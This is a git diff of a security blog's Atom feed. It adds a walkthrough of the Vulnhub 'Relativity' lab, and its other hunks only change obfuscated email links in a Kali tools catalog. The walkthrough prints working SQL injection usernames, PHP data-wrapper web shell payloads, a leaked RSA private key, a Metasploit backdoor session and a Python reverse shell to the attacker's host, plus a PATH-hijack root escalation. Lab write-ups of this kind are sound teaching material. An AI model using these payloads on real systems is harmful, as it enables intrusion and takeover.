@@ -4,7 +4,7 @@
   <title><![CDATA[Category: security | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2015-05-09T16:47:38+03:00</updated>
+  <updated>2015-05-26T20:41:52+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,398 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Pentest lab - Relativity]]></title>
+    <link href="http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity/"/>
+    <updated>2015-05-10T16:40:50+03:00</updated>
+    <id>http://chousensha.github.io/blog/2015/05/10/pentest-lab-relativity</id>
+    <content type="html"><![CDATA[<p>I selected the Relativity VM from Vulnhub as my next home lab target. The objective is to read <code>/root/flag.txt</code>. Let&rsquo;s get started!</p>
+
+<!-- more -->
+
+
+<p>``` plain
+ nmap -A -p1-65535 192.168.80.128</p>
+
+<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-10 16:46 EEST
+Nmap scan report for 192.168.80.128
+Host is up (0.00058s latency).
+Not shown: 65532 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
+| ssh-hostkey:
+|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
+|<em>  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
+80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
+|</em>http-title: M.C. Escher &ndash; Relativity
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="http://www.insecure.org/cgi-bin/servicefp-submit.cgi">http://www.insecure.org/cgi-bin/servicefp-submit.cgi</a> :
+SF-Port21-TCP:V=6.47%I=7%D=5/10%Time=554F618E%P=x86_64-unknown-linux-gnu%r
+SF:(GenericLines,29,&ldquo;220\x20Welcome\x20to\x20Relativity\x20FTP\x20(mod_sq
+SF:l)\r\n&rdquo;);
+MAC Address: 00:0C:29:9F:1D:0E (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 &ndash; 3.10
+Network Distance: 1 hop
+Service Info: Host: Relativity
+```</p>
+
+<p>The web server doesn&rsquo;t seem to serve anything else than an image. I ran Nikto and Dirbuster on it but didn&rsquo;t find anything. Next I hit the FTP server. No anonymous login possible, but there was something interesting in the banner:</p>
+
+<p><code>plain
+220 Welcome to Relativity FTP (mod_sql)
+</code></p>
+
+<p>I started googling, and it turns out that <a href="http://www.proftpd.org/docs/contrib/mod_sql.html">&ldquo;The mod_sql module is an authentication and logging module for ProFTPD&rdquo;</a>. The good news is, <a href="https://www.rapid7.com/db/vulnerabilities/ftp-proftpd-sql-injection">there is a SQLi vulnerability</a> in the USER command that might allow access to the server. I don&rsquo;t know the version of our target server, but let&rsquo;s try it!</p>
+
+<p>On <a href="http://www.securityfocus.com/bid/33722/exploit">http://www.securityfocus.com/bid/33722/exploit</a> you can find some sample exploit strings:</p>
+
+<p>``` plain
+username: %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users; &mdash;
+password: 1</p>
+
+<p>username: %&lsquo;) and 1=2 union (select &lt;name&gt;,1,&lt;uid&gt;,&lt;gid&gt;,0x2F,0x2F62696E2F62617368); &mdash; a
+```</p>
+
+<p>Neither worked, but I tinkered with the comment characters and found out that I could get in either by replacing the <em>&mdash;</em> with a <em>#</em>, or by inserting a space and random characters after the <em>&mdash;</em>:</p>
+
+<p><code>plain
+220 Welcome to Relativity FTP (mod_sql)
+Name (192.168.80.128:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
+331 Password required for username:.
+Password:
+230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></p>
+
+<p>Next, I found out an interesting looking directory:</p>
+
+<p><code>plain
+ftp&gt; pwd
+257 "/" is current directory.
+ftp&gt; dir
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
+-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
+-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
+226 Transfer complete.
+</code></p>
+
+<p>It seems we are in the root directory, but the html and image file hint at the web server. So I went to the website again and this time I tried to navigate to that new directory:</p>
+
+<p><img class="center" src="/images/pentest/relativity/secretdir.png" title="&lsquo;secretdir&rsquo; &lsquo;secretdir&rsquo;" ></p>
+
+<p>I looked around at the pages, noticed the URL when accessing them looks something like this: <code><a href="http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php">http://192.168.80.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php</a></code>. So I tried some local file inclusion, but it didn&rsquo;t get me anywhere. To get to the next step, I needed some external reading and inspiration. For the exploit, we can leverage PHP&rsquo;s <a href="http://php.net/manual/en/wrappers.php">stream wrappers</a>: PHP comes with many built-in wrappers for various URL-style protocols for use with the filesystem functions such as fopen(), copy(), file_exists() and filesize(). On <a href="https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/">this blog post</a> there is a nice explanation and examples of how to get remote code execution by leveraging the <a href="http://php.net/manual/en/wrappers.data.php">data stream</a>. If you look at the examples, you can see that the content passed as a base64 string is being interpreted.
+Check page 9 of <a href="https://www.imperva.com/docs/HII_Remote_and_Local_File_Inclusion_Vulnerabilities.pdf">this pdf</a> for a summary of this remote file inclusion technique. Bottom line: we can base64 encode PHP commands and feed them to the target. So to test this out:</p>
+
+<p>``` plain</p>
+
+<h1>simple RFI</h1>
+
+<p>page=data://text/plain, &lt;?php system(&ldquo;whoami&rdquo;);?></p>
+
+<h1>base64 encoded RFI</h1>
+
+<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs/Pg==</p>
+
+<h1>mini shell</h1>
+
+<p>page=data://text/plain,&lt;?php system($_GET[cmd]);?>&amp;cmd=id</p>
+
+<h1>base64 + URL encoded mini shell (didn&rsquo;t work without URL encoding)</h1>
+
+<p>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8%2B&amp;cmd=id
+```</p>
+
+<p>And we are free to enumerate! Next thing I did was to read <em>/etc/passwd</em> (look at it in the source code of the page for better readability). This gave me the name of 2 users on the machine:</p>
+
+<h2>``` plain</h2>
+
+<p>mauk:x:1001:1001::/home/mauk:/bin/bash
+jetta:x:1002:1002::/home/jetta:/bin/bash
+```</p>
+
+<p>Next I looked around some more, and when listing the home directories, I noticed that mauk&rsquo;s home folder permissions aren&rsquo;t what they should be (but good for us!):</p>
+
+<p><code>plain
+drwx------. 3 jetta jetta 4096 Jul  9  2013 jetta
+drwxr-xr-x. 3 mauk  mauk  4096 Jul  9  2013 mauk
+</code></p>
+
+<p>Looking in mauk&rsquo;s directory, this is interesting:</p>
+
+<p><code>
+drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
+</code></p>
+
+<p>Even better, inside there is mauk&rsquo;s private SSH key!</p>
+
+<p>``` plain
+-rw-r&mdash;r&mdash;. 1 mauk mauk 1679 Feb 24  2013 id_rsa</p>
+
+<p>```</p>
+
+<p>And we can read it:</p>
+
+<p><code>plain
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
+9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
+5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
+zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
+ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
+xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
+tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
+jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
+f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
+r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
+Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
+BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
+MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
+szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
+YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
++Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
+3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
+Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
+3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
+ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
+dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
+J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
+ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
+bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
+aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
+-----END RSA PRIVATE KEY-----
+</code></p>
+
+<p>We can save this private key on our machine and use it to log in as mauk! After looking around without any major discoveries, I noticed this folder in <em>/opt/</em>:</p>
+
+<p><code>plain
+[mauk@Relativity ~]$ ls -l /opt
+total 4
+drwx------ 13 jetta jetta 4096 May 20 18:32 Unreal
+</code></p>
+
+<p>That means there is an Unreal IRCd server there! But I didn&rsquo;t find one when port scanning. Looking at the listening programs, there is indeed an IRC server listening on localhost on port 6667:</p>
+
+<p><code>plain
+[mauk@Relativity ~]$ netstat -lntp
+(No info could be read for "-p": geteuid()=1001 but you should be root.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
+...
+</code></p>
+
+<p>The ircd server might be an avenue for privilege escalation to jetta:</p>
+
+<p><code>plain
+[mauk@Relativity ~]$ ps -u jetta
+  PID TTY          TIME CMD
+  557 ?        00:00:00 ircd
+</code></p>
+
+<p>But there was no netcat installed on the machine, so to find some information about the irc server, I set up SSH port forwarding so I can access it from my machine:</p>
+
+<p><code>plain
+root@kali:~# ssh -L 4444:127.0.0.1:6667 mauk@192.168.80.128
+Last login: Sat May 23 18:25:04 2015 from 192.168.80.130
+[mauk@Relativity ~]$
+</code></p>
+
+<p>And now I could port scan my local 4444 port to learn more:</p>
+
+<p>``` plain
+root@kali:~# nmap -A -sV 127.0.0.1 4444</p>
+
+<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-05-23 16:31 EEST
+setup_target: failed to determine route to 4444 (0.0.17.92)
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000065s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE VERSION
+4444/tcp open  irc     Unreal ircd
+| irc-info:
+|   server: relativity.localdomain
+|   version: Unreal3.2.8.1. relativity.localdomain
+|   servers: 1
+|   users: 1
+|   lservers: 0
+|   lusers: 1
+|   uptime: 0 days, 0:51:08
+|   source host: rox-D2735CD4
+|_  source ident: nmap
+```</p>
+
+<p>I googled the version and it contains a backdoor, and there is a Metasploit module for it. I fired up Metasploit and used against my localhost and port (remember the port forwarding), and got a shell as jetta! But if you want to know more about the backdoor and how to exploit it manually, read <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">this</a>.</p>
+
+<p>``` plain
+msf exploit(unreal_ircd_3281_backdoor) > run</p>
+
+<p>[<em>] Started reverse handler on 192.168.80.130:5555
+[</em>] Connected to 127.0.0.1:4444&hellip;</p>
+
+<pre><code>:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
+</code></pre>
+
+<p>[<em>] Sending backdoor command&hellip;
+[</em>] Command shell session 1 opened (192.168.80.130:5555 &ndash;> 192.168.80.128:41061) at 2015-05-23 17:18:12 +0300</p>
+
+<p>whoami
+jetta
+```</p>
+
+<p>In jetta&rsquo;s home directory there is a directory named <code>auth_server</code> with a binary inside. I ran <em>strings</em> on it:</p>
+
+<p><code>plain
+strings /home/jetta/auth_server/auth_server
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+fflush
+puts
+putchar
+printf
+poll
+stdout
+system
+__libc_start_main
+GLIBC_2.2.5
+l$ L
+t$(L
+|$0H
+[+] Checking Certificates...
+done
+[+] Contacting server, please wait...
+could not establish connection
+invalid certificates
+error: (12)
+fortune -s | /usr/bin/cowsay
+Starting Auth server..
+;*3$"
+</code></p>
+
+<p>Interesting. This binary also appears to be owned as root:</p>
+
+<p><code>plain
+ls -l /home/jetta/auth_server/auth_server
+-rwxr-xr-x 1 root root 8010 Mar  8  2013 /home/jetta/auth_server/auth_server
+</code></p>
+
+<p>I tried to <em>sudo -l</em> to see if jetta can run any commands as root, but there was no output in my shell. So I checked if the shell I have is interactive using <a href="http://unix.stackexchange.com/questions/26676/how-to-check-if-a-shell-is-login-interactive-batch">this SO post</a>:</p>
+
+<p><code>plain
+[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'Not interactive'
+Not interactive
+</code></p>
+
+<p>I then read <a href="http://netsec.ws/?p=337">this post</a> about spawning a TTY shell and used the first of the choices for a proper shell:</p>
+
+<p>``` plain
+python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
+sh-4.2$ sudo -l
+sudo -l
+Matching Defaults entries for jetta on this host:</p>
+
+<pre><code>requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
+LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
+LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+XAUTHORITY PATH", env_reset
+</code></pre>
+
+<p>User jetta may run the following commands on this host:</p>
+
+<pre><code>(root) NOPASSWD: /home/jetta/auth_server/auth_server
+</code></pre>
+
+<p>```</p>
+
+<p>Excellent, so the key to getting root is in exploiting that binary we found earlier. I ran it to see what it does:</p>
+
+<p>``` plain
+sh-4.2$ /home/jetta/auth_server/auth_server
+/home/jetta/auth_server/auth_server
+[+] Checking Certificates&hellip;done
+[+] Contacting server, please wait&hellip;could not establish connection
+error: (12)</p>
+
+<hr />
+
+<p>&lt; There isn&rsquo;t any problem ></p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+
+<p>I ran it several times for fun, made a mental note to replace my fortune cookies at the end of the blog posts with cowsay fortune cookies because this is purely awesome, then looked at <em>strings</em> again. Looking at the line <code>fortune -s | /usr/bin/cowsay</code>, we see that the <em>fortune</em> command doesn&rsquo;t use an absolute path. So we can create a program of our choosing called fortune and modify our PATH variable to start looking in the location of our program. At this point I tried several ways to get a local or reverse root shell but I kept getting errors that the fortune file is busy, so instead of running the exploit every time and then getting a TTY shell on top of it, I thought maybe I can log in directly as jetta now and work from there. So I made a <code>.ssh</code> directory inside jetta&rsquo;s home folder and copied there mauk&rsquo;s <code>authorized_keys</code> file (remember the permissions were too lax). So now I could directly ssh as jetta and try again for the shell.</p>
+
+<p>This time I used a <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Python reverse shell</a>:</p>
+
+<p><code>plain
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.130",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code>
+I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>
+
+<p>``` plain</p>
+
+<p>[jetta@Relativity ~]$ chmod 777 /tmp/fortune</p>
+
+<p>[jetta@Relativity ~]$ export PATH=&ldquo;/tmp:$PATH&rdquo;</p>
+
+<p>[jetta@Relativity ~]$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin
+```</p>
+
+<p>On my machine I had netcat listen for connections:</p>
+
+<p><code>plain
+root@kali:~# nc -vnlp 5555
+nc: listening on :: 5555 ...
+nc: listening on 0.0.0.0 5555 ...
+</code></p>
+
+<p>And now I ran <code>auth_server</code> again:</p>
+
+<p><code>plain
+[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
+[+] Checking Certificates...done
+[+] Contacting server, please wait...could not establish connection
+error: (12)
+</code></p>
+
+<p>And on my netcat side:</p>
+
+<p><code>plain
+sh-4.2# whoami
+whoami
+root
+sh-4.2# cat /root/flag.txt
+cat /root/flag.txt
+65afa0e5928b98f7ae283e16df2d43bf
+</code></p>
+
+<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>
+
+<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>
+
+<p><img class="center" src="/images/pentest/relativity/cookie.png" title="&lsquo;cookie&rsquo; &lsquo;fortune cowsay&rsquo;" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
@@ -207,7 +599,7 @@ stdin) or an airolib-ng has to be used.</p>
 <p>Generates lookup file for asleap</p>
 
 <p>``` plain
-genkeys 2.2 &ndash; generates lookup file for asleap. <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#x77;&#114;&#x69;&#x67;&#x68;&#x74;&#64;&#104;&#x61;&#x73;&#98;&#111;&#x72;&#103;&#46;&#99;&#x6f;&#109;">&#x6a;&#x77;&#x72;&#105;&#x67;&#x68;&#x74;&#x40;&#104;&#x61;&#115;&#98;&#111;&#x72;&#103;&#x2e;&#99;&#x6f;&#109;</a>
+genkeys 2.2 &ndash; generates lookup file for asleap. <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#106;&#x77;&#x72;&#x69;&#x67;&#104;&#x74;&#64;&#x68;&#97;&#115;&#98;&#x6f;&#114;&#x67;&#x2e;&#99;&#111;&#109;">&#x6a;&#119;&#x72;&#x69;&#x67;&#104;&#x74;&#64;&#x68;&#97;&#x73;&#98;&#111;&#x72;&#103;&#x2e;&#99;&#111;&#109;</a>
 genkeys: Must supply -r -f and -n
 Usage: genkeys [options]</p>
 
@@ -273,7 +665,7 @@ Usage: giskismet [Options]</p>
    -v  &mdash;version                    Display version
    -h  &mdash;help                       Display this information</p>
 
-<p>Send Comments to Joshua &ldquo;Jabra&rdquo; Abraham ( <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#106;&#x61;&#x62;&#x72;&#97;&#64;&#x73;&#x70;&#108;&#48;&#105;&#x74;&#x2e;&#x6f;&#114;&#x67;">&#x6a;&#97;&#98;&#x72;&#97;&#64;&#115;&#112;&#x6c;&#x30;&#105;&#x74;&#x2e;&#x6f;&#114;&#x67;</a> )
+<p>Send Comments to Joshua &ldquo;Jabra&rdquo; Abraham ( <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x6a;&#x61;&#98;&#x72;&#x61;&#x40;&#x73;&#112;&#108;&#48;&#105;&#x74;&#46;&#x6f;&#x72;&#103;">&#106;&#97;&#x62;&#114;&#x61;&#x40;&#115;&#112;&#x6c;&#x30;&#105;&#x74;&#46;&#111;&#x72;&#x67;</a> )
 ```</p>
 
 <p><strong>kismet</strong></p>
@@ -407,7 +799,7 @@ Usage: /usr/bin/wifi-honey <essid> <channel> <interface></p>
 <p>Default channel is 1
 Default interface is wlan0</p>
 
-<p>Robin Wood <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#111;&#98;&#105;&#x6e;&#x40;&#x64;&#x69;&#103;&#x69;&#x6e;&#x69;&#x6e;&#106;&#x61;&#46;&#x6f;&#x72;&#103;">&#114;&#111;&#x62;&#105;&#x6e;&#64;&#100;&#x69;&#x67;&#x69;&#x6e;&#x69;&#110;&#x6a;&#97;&#46;&#111;&#x72;&#x67;</a>
+<p>Robin Wood <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#114;&#111;&#x62;&#105;&#x6e;&#64;&#x64;&#x69;&#103;&#x69;&#110;&#105;&#x6e;&#x6a;&#97;&#x2e;&#111;&#x72;&#x67;">&#x72;&#111;&#98;&#105;&#x6e;&#x40;&#x64;&#105;&#103;&#x69;&#110;&#105;&#x6e;&#106;&#x61;&#x2e;&#x6f;&#114;&#x67;</a>
 See Security Tube Wifi Mega Primer episode 26 for more information
 ```</p>
 
@@ -542,7 +934,7 @@ possible Bluetooth targets there are in the surrounding environment.</p>
 
 <p>``` plain</p>
 
-<h2>Bluelog (v1.1.2) by Tom Nardi &ldquo;MS3FGX&rdquo; (<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x4d;&#83;&#51;&#70;&#71;&#88;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#99;&#111;&#x6d;">&#x4d;&#83;&#51;&#x46;&#71;&#x58;&#x40;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a>)</h2>
+<h2>Bluelog (v1.1.2) by Tom Nardi &ldquo;MS3FGX&rdquo; (<a href="&#109;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x4d;&#83;&#x33;&#x46;&#71;&#88;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#77;&#83;&#x33;&#x46;&#x47;&#88;&#x40;&#103;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a>)</h2>
 
 <p>Bluelog is a Bluetooth site survey tool, designed to tell you how
 many discoverable devices there are in an area as quickly as possible.
@@ -701,7 +1093,7 @@ options</p>
 
 <p>``` plain
 zbassocflood: Transmit a flood of associate requests to a target network.
-<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x6a;&#119;&#x72;&#105;&#x67;&#x68;&#116;&#64;&#119;&#105;&#x6c;&#108;&#104;&#97;&#x63;&#107;&#102;&#111;&#x72;&#115;&#117;&#x73;&#104;&#105;&#x2e;&#x63;&#x6f;&#x6d;">&#x6a;&#x77;&#114;&#105;&#x67;&#x68;&#116;&#64;&#119;&#105;&#x6c;&#108;&#104;&#97;&#99;&#x6b;&#102;&#x6f;&#x72;&#115;&#x75;&#x73;&#104;&#105;&#46;&#x63;&#111;&#x6d;</a></p>
+<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#x77;&#114;&#x69;&#x67;&#104;&#x74;&#64;&#119;&#x69;&#x6c;&#x6c;&#x68;&#x61;&#x63;&#x6b;&#102;&#x6f;&#114;&#115;&#117;&#x73;&#x68;&#105;&#46;&#x63;&#111;&#x6d;">&#106;&#119;&#114;&#105;&#x67;&#104;&#x74;&#x40;&#119;&#105;&#x6c;&#108;&#104;&#97;&#99;&#x6b;&#x66;&#x6f;&#114;&#115;&#117;&#x73;&#104;&#105;&#46;&#x63;&#111;&#109;</a></p>
 
 <p>Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]</p>
 
@@ -718,7 +1110,7 @@ process libpcap or Daintree SNA capture files.</p>
 
 <p>``` plain
 zbdsniff: Decode plaintext key ZigBee delivery from a capture file.  Will
-process libpcap or Daintree SNA capture files.    <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x77;&#114;&#105;&#x67;&#x68;&#x74;&#64;&#x77;&#x69;&#108;&#108;&#x68;&#97;&#99;&#107;&#x66;&#x6f;&#114;&#x73;&#x75;&#x73;&#x68;&#105;&#x2e;&#x63;&#111;&#x6d;">&#x6a;&#x77;&#x72;&#x69;&#103;&#x68;&#116;&#64;&#119;&#x69;&#108;&#108;&#x68;&#97;&#99;&#107;&#102;&#111;&#114;&#115;&#x75;&#x73;&#x68;&#105;&#46;&#x63;&#111;&#109;</a></p>
+process libpcap or Daintree SNA capture files.    <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#106;&#x77;&#114;&#x69;&#103;&#104;&#116;&#64;&#119;&#105;&#108;&#x6c;&#104;&#x61;&#99;&#107;&#x66;&#x6f;&#114;&#x73;&#x75;&#x73;&#104;&#x69;&#x2e;&#99;&#111;&#109;">&#x6a;&#x77;&#x72;&#105;&#103;&#x68;&#x74;&#64;&#119;&#105;&#x6c;&#108;&#104;&#x61;&#99;&#107;&#x66;&#111;&#114;&#115;&#x75;&#115;&#104;&#105;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 
 <p>Usage: zbdsniff [capturefiles &hellip;]
 ```</p>
@@ -729,7 +1121,7 @@ process libpcap or Daintree SNA capture files.    <a href="&#109;&#x61;&#105;&#x
 
 <p>``` plain
 zbdump &ndash; a tcpdump-like tool for ZigBee/IEEE 802.15.4 networks
-Compatible with Wireshark 1.1.2 and later &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#106;&#x77;&#x72;&#105;&#103;&#104;&#116;&#64;&#x77;&#x69;&#108;&#108;&#x68;&#x61;&#99;&#x6b;&#102;&#x6f;&#x72;&#x73;&#117;&#115;&#x68;&#105;&#46;&#99;&#x6f;&#x6d;">&#106;&#x77;&#114;&#x69;&#103;&#x68;&#x74;&#64;&#119;&#105;&#108;&#x6c;&#x68;&#x61;&#x63;&#107;&#102;&#111;&#114;&#115;&#x75;&#x73;&#x68;&#x69;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
+Compatible with Wireshark 1.1.2 and later &ndash; <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#106;&#119;&#x72;&#x69;&#103;&#x68;&#116;&#x40;&#119;&#x69;&#x6c;&#108;&#104;&#x61;&#x63;&#x6b;&#102;&#x6f;&#x72;&#115;&#x75;&#x73;&#x68;&#105;&#x2e;&#99;&#x6f;&#x6d;">&#106;&#119;&#x72;&#105;&#x67;&#x68;&#x74;&#x40;&#119;&#x69;&#108;&#108;&#x68;&#x61;&#x63;&#x6b;&#102;&#111;&#114;&#115;&#x75;&#x73;&#104;&#105;&#46;&#x63;&#111;&#109;</a></p>
 
 <p>Usage: zbdump [-fiwDch] [-f channel] [-w pcapfile] [-W daintreefile]</p>
 
@@ -751,7 +1143,7 @@ SNA or libpcap IEEE 802.15.4 encrypted packet</p>
 
 <p>``` plain
 zbgoodfind &ndash; search a binary file to identify the encryption key for a given
-SNA or libpcap IEEE 802.15.4 encrypted packet &ndash; <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#106;&#119;&#114;&#105;&#103;&#104;&#x74;&#64;&#x77;&#105;&#x6c;&#108;&#104;&#x61;&#99;&#107;&#x66;&#x6f;&#114;&#115;&#117;&#x73;&#104;&#x69;&#46;&#99;&#x6f;&#109;">&#106;&#119;&#x72;&#105;&#x67;&#104;&#116;&#x40;&#119;&#x69;&#x6c;&#108;&#x68;&#x61;&#99;&#x6b;&#102;&#111;&#114;&#x73;&#x75;&#115;&#104;&#x69;&#x2e;&#99;&#111;&#x6d;</a></p>
